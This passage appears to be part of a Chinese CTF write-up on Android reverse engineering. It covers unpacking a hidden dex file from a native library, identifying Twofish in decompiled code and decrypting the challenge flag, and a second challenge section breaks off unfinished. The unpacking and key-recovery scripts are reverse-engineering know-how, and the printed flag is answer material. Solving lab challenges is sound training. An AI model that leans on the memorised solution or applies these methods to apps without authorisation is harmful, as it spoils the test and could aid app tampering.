data, (uLong)size_1) )// uncompress data              _android_log_print(5, &quot;FindMyDex&quot;, &quot;Dangerous operation detected.&quot;);            v21 = open(filename, 577, 511);            if ( !v21 )              _android_log_print(5, &quot;FindMyDex&quot;, &quot;Something wrong with the permission.&quot;);            write(v21, dest, destLen);            close(v21);            free(dest);            free(data);            if ( access(name, 0) &amp;&amp; mkdir(name, 0x1FFu) )              _android_log_print(5, &quot;FindMyDex&quot;, &quot;Something wrong with the permission..&quot;);            sub_2368((int)v1);            remove(filename);            _android_log_print(4, &quot;FindMyDex&quot;, &quot;Congratulations!! You made it!&quot;);            sub_2250(v1);            v10 = 0x80000000;            v6 = v20;          }        }      }    }...</code></pre><p>用 IDC 脚本把数据 dump 下来：</p><pre><code class="cpp">static main() {    auto fp, start, end, len, b;    fp = fopen(&quot;dump.data&quot;, &quot;wb&quot;);    start = 0x7004;    len = 0x3CA10;    end = start + len;    for (b = start; b &lt; end; b++) {        fputc(Byte(b), fp);    }}</code></pre><p>然后实现一下对 dex 文件的解压缩过程：</p><pre><code class="python">#!/usr/bin/env pythonimport zlibwith open(&#39;dump.data&#39;, &#39;rb&#39;) as f:    data = f.read()data = [ord(c) for c in data]size = 0x3CA10for times in range(90):    v15 = times / 10    if times % 10 == 9:        v16 = size        v17 = size / 10        v18 = (v15 + 1) * (size / 10)        if size / 10 * v15 &lt; v18:            for i in range(v17):                data[v17 * v15 + i] ^= times        if times == 89:            while v18 - v16 &lt; 0:                data[v18] ^= 0x59                v18 += 1data = &#39;&#39;.join([chr(c) for c in data])data = zlib.decompress(data)with open(&#39;dump.dex&#39;, &#39;wb&#39;) as f:    for c in data:        f.write(c)</code></pre><p>接下来用 JEB 对 dex 文件进行分析。首先在 MainActivity 中，变量 m 是密文，onCreate 中调用了 a 类。函数 b 则是一个加密函数，其中涉及到了 b 类中函数：</p><pre><code class="java">package com.a.sample.findmydex;import android.content.Context;import android.os.Bundle;import android.support.v7.a.u;import java.io.BufferedInputStream;import java.io.ByteArrayInputStream;import java.nio.ByteBuffer;import java.util.ArrayList;public class MainActivity extends u {    private static byte[] m;    static {        MainActivity.m = new byte[]{-120, 77, -14, -38, 17, 5, -42, 44, -32, 109, 85, 0x1F, 24, -91, -112, -83, 0x40, -83, -128, 84, 5, -94, -98, -30, 18, 70, -26, 71, 5, -99, -62, -58, 0x75, 29, -44, 6, 0x70, -4, 81, 84, 9, 22, -51, 0x5F, -34, 12, 0x2F, 77};    }    public MainActivity() {        super();    }    static byte[] a(String arg1, String arg2) {        return MainActivity.b(arg1, arg2);    }    private static byte[] b(String arg7, String arg8) {        byte[] v0_1;        try {            BufferedInputStream v2 = new BufferedInputStream(new ByteArrayInputStream(arg7.getBytes()));            byte[] v1 = new byte[16];            ArrayList v3 = new ArrayList();            Object v4 = b.a(arg8.getBytes()); // 处理密钥            while(v2.read(v1, 0, 16) != -1) { // 循环加密，采用ECB模式                v3.add(b.a(v1, 0, v4));                v1 = new byte[16];            }            ByteBuffer v2_1 = ByteBuffer.allocate(v3.size() * 16); // 转换成字节数组            Object[] v3_1 = v3.toArray();            int v4_1 = v3_1.length;            int v1_1;            for(v1_1 = 0; v1_1 &lt; v4_1; ++v1_1) {                v2_1.put(v3_1[v1_1]);            }            v0_1 = v2_1.array();        }        catch(Exception v0) {            v0_1 = new byte[1];        }        return v0_1;    }    static byte[] i() { // Cipheretxt        return MainActivity.m;    }    protected void onCreate(Bundle arg4) {        super.onCreate(arg4);        this.setContentView(0x7F04001A); // activity_main        this.findViewById(0x7F0B0055).setOnClickListener(new a(this, this.findViewById(0x7F0B0054), ((Context)this))); // button | edit_text    }}</code></pre><p>类 a 中设置了一个监听按钮的事件，并将输入和指定的字符串作为参数传入 MainActivity 的函数 a。并与密文进行比较：</p><pre><code class="java">package com.a.sample.findmydex;import android.content.Context;import android.view.View$OnClickListener;import android.view.View;import android.widget.EditText;import android.widget.Toast;import java.util.Arrays;class a implements View$OnClickListener {    a(MainActivity arg1, EditText arg2, Context arg3) {        this.c = arg1;        this.a = arg2;        this.b = arg3;        super();    }    public void onClick(View arg5) {        if(Arrays.equals(MainActivity.a(this.a.getText().toString(), this.c.getString(0x7F060023)), MainActivity.i())) { // I have a male fish and a female fish.            Toast.makeText(this.b, this.c.getString(0x7F060025), 1).show(); // Yes! You got me! :)        }        else {            Toast.makeText(this.b, this.c.getString(0x7F060022), 1).show(); // NO~ You don&#39;t get me~ T_T        }    }}</code></pre><p>b 类的 a 函数主要将数组的长度补齐成 8 的倍数，并调用 b 函数：</p><pre><code class="java">    public static Object a(byte[] arg5) { // 补齐块        Object v0_3;        int v1 = 0x20;        int v0 = 0;        Class v2 = b.class;        __monitor_enter(v2);        try {            if(arg5.length &gt; v1 || arg5.length % 8 != 0) { // 长度大于32或不是8的倍数                if(arg5.length &lt;= v1) {                    v1 = arg5.length;                }                if((v1 &amp; 7) &gt; 0) { // 判断数组长度是否是8的倍数，不是的话补齐                    v0 = 1;                }                byte[] v0_2 = new byte[v0 * 8 + v1];                System.arraycopy(arg5, 0, v0_2, 0, v1);                arg5 = v0_2;            }            v0_3 = b.b(arg5);        }        catch(Throwable v0_1) {            __monitor_exit(v2);            throw v0_1;        }        __monitor_exit(v2);        return v0_3;    }</code></pre><p>b 类中的 b 函数是一个处理密钥的函数：</p><pre><code class="java">    private static Object b(byte[] arg19) { // 处理密钥        Object[] v1_2;        int[] v13;        int v10_1;        int v9_1;        int v8_1;        int[] v11_1;        int v12;        int v3;        int v1_1;        int v5;        int v4;        Class v6 = b.class;        __monitor_enter(v6);        if(arg19 != null) {            goto label_10;        }        try {            throw new InvalidKeyException(&quot;Empty key&quot;);        label_10:            v4 = arg19.length;            if(v4 != 8 &amp;&amp; v4 != 16 &amp;&amp; v4 != 24 &amp;&amp; v4 != 0x20) {                throw new InvalidKeyException(&quot;Incorrect key length&quot;);            }            int v7 = v4 / 8;            v5 = 40;            int[] v8 = new int[4];            int[] v9 = new int[4];            int[] v10 = new int[4];            v1_1 = 0;            v3 = 0;            int v2;            for(v2 = v7 - 1; v3 &lt; 4; --v2) {                if(v1_1 &gt;= v4) {                    break;                }                int v11 = v1_1 + 1;                v12 = v11 + 1;                v1_1 = arg19[v1_1] &amp; 0xFF | (arg19[v11] &amp; 0xFF) &lt;&lt; 8;                v11 = v12 + 1;                v1_1 |= (arg19[v12] &amp; 0xFF) &lt;&lt; 16;                v12 = v11 + 1;                v8[v3] = v1_1 | (arg19[v11] &amp; 0xFF) &lt;&lt; 24;                v1_1 = v12 + 1;                v11 = arg19[v12] &amp; 0xFF;                v12 = v1_1 + 1;                v1_1 = (arg19[v1_1] &amp; 0xFF) &lt;&lt; 8 | v11;                v11 = v12 + 1;                v12 = (arg19[v12] &amp; 0xFF) &lt;&lt; 16 | v1_1;                v1_1 = v11 + 1;                v9[v3] = (arg19[v11] &amp; 0xFF) &lt;&lt; 24 | v12;                v10[v2] = b.a(v8[v3], v9[v3]);                ++v3;            }            v11_1 = new int[v5];            v1_1 = 0;            v2 = 0;            while(v2 &lt; 20) {                v3 = b.a(v7, v1_1, v8);                v4 = b.a(v7, 0x1010101 + v1_1, v9);                v4 = v4 &gt;&gt;&gt; 24 | v4 &lt;&lt; 8;                v3 += v4;                v11_1[v2 * 2] = v3;                v3 += v4;                v11_1[v2 * 2 + 1] = v3 &gt;&gt;&gt; 23 | v3 &lt;&lt; 9;                ++v2;                v1_1 += 0x2020202;            }            v8_1 = v10[0];            v9_1 = v10[1];            v12 = v10[2];            v10_1 = v10[3];            v13 = new int[0x400];            v2 = 0;            while(true) {            label_120:                if(v2 &gt;= 0x100) {                    goto label_324;                }                switch(v7 &amp; 3) {                    case 0: {                        goto label_183;                    }                    case 1: {                        goto label_126;                    }                    case 2: {                        goto label_332;                    }                    case 3: {                        goto label_337;                    }                }                goto label_124;            }        }        catch(Throwable v1) {            goto label_8;        }    label_337:        v1_1 = v2;        v3 = v2;        v4 = v2;        v5 = v2;        goto label_211;        try {        label_183:            v5 = b.a[1][v2] &amp; 0xFF ^ b.e(v10_1);            v4 = b.a[0][v2] &amp; 0xFF ^ b.f(v10_1);            v3 = b.g(v10_1) ^ b.a[0][v2] &amp; 0xFF;            v1_1 = b.a[1][v2] &amp; 0xFF ^ b.h(v10_1);        label_211:            v5 = b.a[1][v5] &amp; 0xFF ^ b.e(v12);            v4 = b.a[1][v4] &amp; 0xFF ^ b.f(v12);            v3 = b.a[0][v3] &amp; 0xFF ^ b.g(v12);            v1_1 = b.a[0][v1_1] &amp; 0xFF ^ b.h(v12);            goto label_239;        }        catch(Throwable v1) {            goto label_8;        }    label_332:        v1_1 = v2;        v3 = v2;        v4 = v2;        v5 = v2;        try {        label_239:            v13[v2 * 2] = b.b[0][b.a[0][b.a[0][v5] &amp; 0xFF ^ b.e(v9_1)] &amp; 0xFF ^ b.e(v8_1)];            v13[v2 * 2 + 1] = b.b[1][b.a[0][b.a[1][v4] &amp; 0xFF ^ b.f(v9_1)] &amp; 0xFF ^ b.f(v8_1)];            v13[v2 * 2 + 0x200] = b.b[2][b.a[1][b.a[0][v3] &amp; 0xFF ^ b.g(v9_1)] &amp; 0xFF ^ b.g(v8_1)];            v13[v2 * 2 + 0x201] = b.b[3][b.a[1][b.a[1][v1_1] &amp; 0xFF ^ b.h(v9_1)] &amp; 0xFF ^ b.h(v8_1)];            goto label_124;        label_126:            v13[v2 * 2] = b.b[0][b.a[0][v2] &amp; 0xFF ^ b.e(v8_1)];            v13[v2 * 2 + 1] = b.b[1][b.a[0][v2] &amp; 0xFF ^ b.f(v8_1)];            v13[v2 * 2 + 0x200] = b.b[2][b.a[1][v2] &amp; 0xFF ^ b.g(v8_1)];            v13[v2 * 2 + 0x201] = b.b[3][b.a[1][v2] &amp; 0xFF ^ b.h(v8_1)];        label_124:            ++v2;            goto label_120;        label_324:            v1_2 = new Object[]{v13, v11_1};        }        catch(Throwable v1) {            goto label_8;        }        __monitor_exit(v6);        return v1_2;    label_8:        __monitor_exit(v6);        throw v1;    }</code></pre><p>这个 a 函数判断传入的字节数组、、密钥都不为空，并调用 b 函数：</p><pre><code class="java">    public static byte[] a(byte[] arg1, int arg2, Object arg3) {        byte[] v0 = arg1 == null || arg3 == null || arg2 &lt; 0 ? null : b.b(arg1, arg2, arg3);        return v0;    }</code></pre><p>b 函数应该就是对数据的加密过程，明显是个 16 次轮函数的分组密码：</p><pre><code class="java">    private static byte[] b(byte[] arg12, int arg13, Object arg14) {        int[] v0 = arg14[0];        Object v1 = arg14[1];        int v2 = arg13 + 1;        int v4 = v2 + 1;        int v3 = v4 + 1;        v2 = (arg12[v2] &amp; 0xFF) &lt;&lt; 8 | arg12[arg13] &amp; 0xFF | (arg12[v4] &amp; 0xFF) &lt;&lt; 16;        v4 = v3 + 1;        v2 |= (arg12[v3] &amp; 0xFF) &lt;&lt; 24;        v3 = v4 + 1;        int v5 = v3 + 1;        v3 = (arg12[v3] &amp; 0xFF) &lt;&lt; 8 | arg12[v4] &amp; 0xFF;        v4 = v5 + 1;        v3 |= (arg12[v5] &amp; 0xFF) &lt;&lt; 16;        v5 = v4 + 1;        v3 |= (arg12[v4] &amp; 0xFF) &lt;&lt; 24;        v4 = v5 + 1;        int v6 = v4 + 1;        v4 = (arg12[v4] &amp; 0xFF) &lt;&lt; 8 | arg12[v5] &amp; 0xFF;        v5 = v6 + 1;        v4 |= (arg12[v6] &amp; 0xFF) &lt;&lt; 16;        v6 = v5 + 1;        v4 |= (arg12[v5] &amp; 0xFF) &lt;&lt; 24;        v5 = v6 + 1;        int v7 = v5 + 1;        int v8 = (arg12[v5] &amp; 0xFF) &lt;&lt; 8 | arg12[v6] &amp; 0xFF | (arg12[v7] &amp; 0xFF) &lt;&lt; 16 | (arg12[v7 + 1] &amp; 0xFF) &lt;&lt; 24;        v7 = v2 ^ v1[0];        v6 = v3 ^ v1[1];        v5 = v4 ^ v1[2];        v4 = v8 ^ v1[3];        v3 = 8;        for(v2 = 0; v2 &lt; 16; v2 += 2) {            v8 = b.a(v0, v7, 0);            int v9 = b.a(v0, v6, 3);            int v11 = v3 + 1;            v3 = v1[v3] + (v8 + v9) ^ v5;            v5 = v3 &gt;&gt;&gt; 1 | v3 &lt;&lt; 0x1F;            v3 = v4 &lt;&lt; 1 | v4 &gt;&gt;&gt; 0x1F;            v4 = v9 * 2 + v8;            v8 = v11 + 1;            v4 = v4 + v1[v11] ^ v3;            v3 = b.a(v0, v5, 0);            v9 = b.a(v0, v4, 3);            v11 = v8 + 1;            v7 ^= v1[v8] + (v3 + v9);            v7 = v7 &lt;&lt; 0x1F | v7 &gt;&gt;&gt; 1;            v8 = v9 * 2 + v3;            v3 = v11 + 1;            v6 = (v6 &gt;&gt;&gt; 0x1F | v6 &lt;&lt; 1) ^ v8 + v1[v11];        }        int v0_1 = v1[4] ^ v5;        v2 = v1[5] ^ v4;        v3 = v1[6] ^ v7;        int v1_1 = v1[7] ^ v6;        return new byte[]{((byte)v0_1), ((byte)(v0_1 &gt;&gt;&gt; 8)), ((byte)(v0_1 &gt;&gt;&gt; 16)), ((byte)(v0_1 &gt;&gt;&gt; 24)), ((byte)v2), ((byte)(v2 &gt;&gt;&gt; 8)), ((byte)(v2 &gt;&gt;&gt; 16)), ((byte)(v2 &gt;&gt;&gt; 24)), ((byte)v3), ((byte)(v3 &gt;&gt;&gt; 8)), ((byte)(v3 &gt;&gt;&gt; 16)), ((byte)(v3 &gt;&gt;&gt; 24)), ((byte)v1_1), ((byte)(v1_1 &gt;&gt;&gt; 8)), ((byte)(v1_1 &gt;&gt;&gt; 16)), ((byte)(v1_1 &gt;&gt;&gt; 24))};    }</code></pre><p>分组密码可以去找一下特征，看到了 b 类的头上定义了两个数据，转成 16 进制之后拿去搜一下：</p><pre><code class="java">        v0[0] = new byte[]{-87, 103, -77, -24, 4, -3, -93, 0x76, -102, -110, -128, 120, -28, -35, -47, 56, 13, -58, 53, -104, 24, -9, -20, 108, 67, 0x75, 55, 38, -6, 19, -108, 72, -14, -48, -117, 0x30, -124, 84, -33, 35, 25, 91, 61, 89, -13, -82, -94, -126, 99, 1, -125, 46, -39, 81, -101, 0x7C, -90, -21, -91, -66, 22, 12, -29, 97, -64, -116, 58, -11, 0x73, 44, 37, 11, -69, 78, -119, 107, 83, 106, -76, -15, -31, -26, -67, 69, -30, -12, -74, 102, -52, -107, 3, 86, -44, 28, 30, -41, -5, -61, -114, -75, -23, -49, -65, -70, -22, 0x77, 57, -81, 51, -55, 98, 0x71, -127, 0x79, 9, -83, 36, -51, -7, -40, -27, -59, -71, 77, 68, 8, -122, -25, -95, 29, -86, -19, 6, 0x70, -78, -46, 65, 0x7B, -96, 17, 49, -62, 39, -112, 0x20, -10, 0x60, -1, -106, 92, -79, -85, -98, -100, 82, 27, 0x5F, -109, 10, -17, -111, -123, 73, -18, 45, 0x4F, -113, 59, 71, -121, 109, 70, -42, 62, 105, 100, 42, -50, -53, 0x2F, -4, -105, 5, 0x7A, -84, 0x7F, -43, 26, 75, 14, -89, 90, 40, 20, 0x3F, 41, -120, 60, 76, 2, -72, -38, -80, 23, 85, 0x1F, -118, 0x7D, 87, -57, -115, 0x74, -73, -60, -97, 0x72, 0x7E, 21, 34, 18, 88, 7, -103, 52, 110, 80, -34, 104, 101, -68, -37, -8, -56, -88, 43, 0x40, -36, -2, 50, -92, -54, 16, 33, -16, -45, 93, 15, 0, 0x6F, -99, 54, 66, 74, 94, -63, -32}; // 0xA9, 0x67, 0xB3, 0xE8, 0x04, 0xFD, 0xA3, 0x76, 0x9A, 0x92, 0x80, 0x78, 0xE4, 0xDD, 0xD1, 0x38, 0x0D, 0xC6, 0x35, 0x98, 0x18, 0xF7, 0xEC, 0x6C, 0x43, 0x75, 0x37, 0x26, 0xFA, 0x13, 0x94, 0x48, 0xF2, 0xD0, 0x8B, 0x30, 0x84, 0x54, 0xDF, 0x23, 0x19, 0x5B, 0x3D, 0x59, 0xF3, 0xAE, 0xA2, 0x82, 0x63, 0x01, 0x83, 0x2E, 0xD9, 0x51, 0x9B, 0x7C, 0xA6, 0xEB, 0xA5, 0xBE, 0x16, 0x0C, 0xE3, 0x61, 0xC0, 0x8C, 0x3A, 0xF5, 0x73, 0x2C, 0x25, 0x0B, 0xBB, 0x4E, 0x89, 0x6B, 0x53, 0x6A, 0xB4, 0xF1, 0xE1, 0xE6, 0xBD, 0x45, 0xE2, 0xF4, 0xB6, 0x66, 0xCC, 0x95, 0x03, 0x56, 0xD4, 0x1C, 0x1E, 0xD7, 0xFB, 0xC3, 0x8E, 0xB5, 0xE9, 0xCF, 0xBF, 0xBA, 0xEA, 0x77, 0x39, 0xAF, 0x33, 0xC9, 0x62, 0x71, 0x81, 0x79, 0x09, 0xAD, 0x24, 0xCD, 0xF9, 0xD8, 0xE5, 0xC5, 0xB9, 0x4D, 0x44, 0x08, 0x86, 0xE7, 0xA1, 0x1D, 0xAA, 0xED, 0x06, 0x70, 0xB2, 0xD2, 0x41, 0x7B, 0xA0, 0x11, 0x31, 0xC2, 0x27, 0x90, 0x20, 0xF6, 0x60, 0xFF, 0x96, 0x5C, 0xB1, 0xAB, 0x9E, 0x9C, 0x52, 0x1B, 0x5F, 0x93, 0x0A, 0xEF, 0x91, 0x85, 0x49, 0xEE, 0x2D, 0x4F, 0x8F, 0x3B, 0x47, 0x87, 0x6D, 0x46, 0xD6, 0x3E, 0x69, 0x64, 0x2A, 0xCE, 0xCB, 0x2F, 0xFC, 0x97, 0x05, 0x7A, 0xAC, 0x7F, 0xD5, 0x1A, 0x4B, 0x0E, 0xA7, 0x5A, 0x28, 0x14, 0x3F, 0x29, 0x88, 0x3C, 0x4C, 0x02, 0xB8, 0xDA, 0xB0, 0x17, 0x55, 0x1F, 0x8A, 0x7D, 0x57, 0xC7, 0x8D, 0x74, 0xB7, 0xC4, 0x9F, 0x72, 0x7E, 0x15, 0x22, 0x12, 0x58, 0x07, 0x99, 0x34, 0x6E, 0x50, 0xDE, 0x68, 0x65, 0xBC, 0xDB, 0xF8, 0xC8, 0xA8, 0x2B, 0x40, 0xDC, 0xFE, 0x32, 0xA4, 0xCA, 0x10, 0x21, 0xF0, 0xD3, 0x5D, 0x0F, 0x00, 0x6F, 0x9D, 0x36, 0x42, 0x4A, 0x5E, 0xC1, 0xE0        v0[1] = new byte[]{0x75, -13, -58, -12, -37, 0x7B, -5, -56, 74, -45, -26, 107, 69, 0x7D, -24, 75, -42, 50, -40, -3, 55, 0x71, -15, -31, 0x30, 15, -8, 27, -121, -6, 6, 0x3F, 94, -70, -82, 91, -118, 0, -68, -99, 109, -63, -79, 14, -128, 93, -46, -43, -96, -124, 7, 20, -75, -112, 44, -93, -78, 0x73, 76, 84, -110, 0x74, 54, 81, 56, -80, -67, 90, -4, 0x60, 98, -106, 108, 66, -9, 16, 0x7C, 40, 39, -116, 19, -107, -100, -57, 36, 70, 59, 0x70, -54, -29, -123, -53, 17, -48, -109, -72, -90, -125, 0x20, -1, -97, 0x77, -61, -52, 3, 0x6F, 8, -65, 0x40, -25, 43, -30, 0x79, 12, -86, -126, 65, 58, -22, -71, -28, -102, -92, -105, 0x7E, -38, 0x7A, 23, 102, -108, -95, 29, 61, -16, -34, -77, 11, 0x72, -89, 28, -17, -47, 83, 62, -113, 51, 38, 0x5F, -20, 0x76, 42, 73, -127, -120, -18, 33, -60, 26, -21, -39, -59, 57, -103, -51, -83, 49, -117, 1, 24, 35, -35, 0x1F, 78, 45, -7, 72, 0x4F, -14, 101, -114, 120, 92, 88, 25, -115, -27, -104, 87, 103, 0x7F, 5, 100, -81, 99, -74, -2, -11, -73, 60, -91, -50, -23, 104, 68, -32, 77, 67, 105, 41, 46, -84, 21, 89, -88, 10, -98, 110, 71, -33, 52, 53, 106, -49, -36, 34, -55, -64, -101, -119, -44, -19, -85, 18, -94, 13, 82, -69, 2, 0x2F, -87, -41, 97, 30, -76, 80, 4, -10, -62, 22, 37, -122, 86, 85, 9, -66, -111}; // 0x75, 0xF3, 0xC6, 0xF4, 0xDB, 0x7B, 0xFB, 0xC8, 0x4A, 0xD3, 0xE6, 0x6B, 0x45, 0x7D, 0xE8, 0x4B, 0xD6, 0x32, 0xD8, 0xFD, 0x37, 0x71, 0xF1, 0xE1, 0x30, 0x0F, 0xF8, 0x1B, 0x87, 0xFA, 0x06, 0x3F, 0x5E, 0xBA, 0xAE, 0x5B, 0x8A, 0x00, 0xBC, 0x9D, 0x6D, 0xC1, 0xB1, 0x0E, 0x80, 0x5D, 0xD2, 0xD5, 0xA0, 0x84, 0x07, 0x14, 0xB5, 0x90, 0x2C, 0xA3, 0xB2, 0x73, 0x4C, 0x54, 0x92, 0x74, 0x36, 0x51, 0x38, 0xB0, 0xBD, 0x5A, 0xFC, 0x60, 0x62, 0x96, 0x6C, 0x42, 0xF7, 0x10, 0x7C, 0x28, 0x27, 0x8C, 0x13, 0x95, 0x9C, 0xC7, 0x24, 0x46, 0x3B, 0x70, 0xCA, 0xE3, 0x85, 0xCB, 0x11, 0xD0, 0x93, 0xB8, 0xA6, 0x83, 0x20, 0xFF, 0x9F, 0x77, 0xC3, 0xCC, 0x03, 0x6F, 0x08, 0xBF, 0x40, 0xE7, 0x2B, 0xE2, 0x79, 0x0C, 0xAA, 0x82, 0x41, 0x3A, 0xEA, 0xB9, 0xE4, 0x9A, 0xA4, 0x97, 0x7E, 0xDA, 0x7A, 0x17, 0x66, 0x94, 0xA1, 0x1D, 0x3D, 0xF0, 0xDE, 0xB3, 0x0B, 0x72, 0xA7, 0x1C, 0xEF, 0xD1, 0x53, 0x3E, 0x8F, 0x33, 0x26, 0x5F, 0xEC, 0x76, 0x2A, 0x49, 0x81, 0x88, 0xEE, 0x21, 0xC4, 0x1A, 0xEB, 0xD9, 0xC5, 0x39, 0x99, 0xCD, 0xAD, 0x31, 0x8B, 0x01, 0x18, 0x23, 0xDD, 0x1F, 0x4E, 0x2D, 0xF9, 0x48, 0x4F, 0xF2, 0x65, 0x8E, 0x78, 0x5C, 0x58, 0x19, 0x8D, 0xE5, 0x98, 0x57, 0x67, 0x7F, 0x05, 0x64, 0xAF, 0x63, 0xB6, 0xFE, 0xF5, 0xB7, 0x3C, 0xA5, 0xCE, 0xE9, 0x68, 0x44, 0xE0, 0x4D, 0x43, 0x69, 0x29, 0x2E, 0xAC, 0x15, 0x59, 0xA8, 0x0A, 0x9E, 0x6E, 0x47, 0xDF, 0x34, 0x35, 0x6A, 0xCF, 0xDC, 0x22, 0xC9, 0xC0, 0x9B, 0x89, 0xD4, 0xED, 0xAB, 0x12, 0xA2, 0x0D, 0x52, 0xBB, 0x02, 0x2F, 0xA9, 0xD7, 0x61, 0x1E, 0xB4, 0x50, 0x04, 0xF6, 0xC2, 0x16, 0x25, 0x86, 0x56, 0x55, 0x09, 0xBE, 0x91</code></pre><p>发现是 twofish 算法：</p><p><img src="/pics/攻防世界-MOBILE-新手练习区/2.png" srcset="/img/loading.gif" alt></p><p>上面的一些资源可以在 Resources/values/public.xml 中找到 ID 对应的字符串名：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;resources&gt;  ...  &lt;public id=&quot;0x7f04001a&quot; name=&quot;activity_main&quot; type=&quot;layout&quot; /&gt;  ...  &lt;public id=&quot;0x7f060022&quot; name=&quot;no&quot; type=&quot;string&quot; /&gt;  &lt;public id=&quot;0x7f060023&quot; name=&quot;two_fish&quot; type=&quot;string&quot; /&gt;  ...  &lt;public id=&quot;0x7f060025&quot; name=&quot;yes&quot; type=&quot;string&quot; /&gt;  ...  &lt;public id=&quot;0x7f0b0054&quot; name=&quot;edit_text&quot; type=&quot;id&quot; /&gt;  &lt;public id=&quot;0x7f0b0055&quot; name=&quot;button&quot; type=&quot;id&quot; /&gt;  ...&lt;/resources&gt;</code></pre><p>可以在 Resources/values/strings.xml 中找到对应的字符串：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;resources&gt;  ...  &lt;string name=&quot;no&quot;&gt;    NO~ You don&#39;t get me~ T_T&lt;/string&gt;  &lt;string name=&quot;two_fish&quot;&gt;    I have a male fish and a female fish.&lt;/string&gt;  &lt;string name=&quot;what_else&quot;&gt;    What else?&lt;/string&gt;  &lt;string name=&quot;yes&quot;&gt;    Yes! You got me! :)&lt;/string&gt;&lt;/resources&gt;</code></pre><p>最后找个库实现一下解密：</p><pre><code class="python">#!/usr/bin/env pythonfrom twofish import Twofishciphertext = [0x88, 0x4D, 0xF2, 0xDA, 0x11, 0x05, 0xD6, 0x2C, 0xE0, 0x6D, 0x55, 0x1F, 0x18, 0xA5, 0x90, 0xAD, 0x40, 0xAD, 0x80, 0x54, 0x05, 0xA2, 0x9E, 0xE2, 0x12, 0x46, 0xE6, 0x47, 0x05, 0x9D, 0xC2, 0xC6, 0x75, 0x1D, 0xD4, 0x06, 0x70, 0xFC, 0x51, 0x54, 0x09, 0x16, 0xCD, 0x5F, 0xDE, 0x0C, 0x2F, 0x4D]ciphertext = &#39;&#39;.join([chr(c) for c in ciphertext])T = Twofish(&#39;I have a male fish and a female &#39;)flag = &#39;&#39;for i in range(0, 48, 16):    flag += T.decrypt(ciphertext[i:i+16])print flag# qwb{TH3y_Io&lt;e_EACh_OTh3r_FOrEUER}</code></pre><h1 id="你是谁"><a href="#你是谁" class="headerlink" title="你是谁"></a>你是谁</h1><p>TODO</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; package=&quot;xyz.konso.testsrtp&quot; platformBuildVersionCode=&quot;23&quot; platformBuildVersionName=&quot;6.0-2166767&quot;&gt;    &lt;uses-sdk android:minSdkVersion=&quot;15&quot; android:targetSdkVersion=&quot;23&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.CHANGE_NETWORK_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.READ_CONTACTS&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.CALL_PHONE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.BROADCAST_STICKY&quot; /&gt;    注：部分手机如无此权限会报错    &lt;uses-permission android:name=&quot;android.permission.BLUETOOTH&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.MODIFY_AUDIO_SETTINGS&quot; /&gt;    &lt;application android:theme=&quot;@style/AppTheme&quot; android:label=&quot;@string/app_name&quot; android:icon=&quot;@mipmap/icon&quot; android:debuggable=&quot;true&quot; android:allowBackup=&quot;true&quot; android:supportsRtl=&quot;true&quot;&gt;        &lt;activity android:name=&quot;xyz.konso.testsrtp.MainActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.view&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;        &lt;activity android:name=&quot;xyz.konso.testsrtp.SplashActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;    &lt;/application&gt;&lt;/manifest&gt;</code></pre><pre><code class="java">package xyz.konso.testsrtp;import android.app.Activity;import android.content.Intent;import android.content.pm.PackageManager.NameNotFoundException;import android.os.Bundle;import android.os.Handler;import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;import android.widget.TextView;public class SplashActivity extends Activity {    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        getWindow().setFlags(AccessibilityNodeInfoCompat.ACTION_NEXT_HTML_ELEMENT, AccessibilityNodeInfoCompat.ACTION_NEXT_HTML_ELEMENT);        setContentView(R.layout.activity_splash);        try {            ((TextView) findViewById(R.id.versionNumber)).setText(&quot;Version &quot; + getPackageManager().getPackageInfo(&quot;com.lyt.android&quot;, 0).versionName);        } catch (NameNotFoundException e) {            e.printStackTrace();        }        new Handler().postDelayed(new Runnable() {            public void run() {                SplashActivity.this.startActivity(new Intent(SplashActivity.this, MainActivity.class));                SplashActivity.this.finish();            }        }, 2500);    }}</code></pre><pre><code class="java">package xyz.konso.testsrtp;import android.app.Activity;import android.media.AudioManager;import android.os.Bundle;import android.util.Log;import android.widget.Button;import android.widget.Toast;import com.iflytek.cloud.InitListener;import com.iflytek.cloud.RecognizerListener;import com.iflytek.cloud.RecognizerResult;import com.iflytek.cloud.SpeechConstant;import com.iflytek.cloud.SpeechError;import com.iflytek.cloud.SpeechRecognizer;import com.iflytek.cloud.SpeechSynthesizer;import com.iflytek.cloud.SpeechUtility;import com.iflytek.cloud.SynthesizerListener;import org.json.JSONObject;public class MainActivity extends Activity {    private String TAG = &quot;shitou&quot;;    private Button button1;    private Button button2;    private AudioManager mAudioManager;    private SpeechRecognizer mIat;    private InitListener mInitListener = new 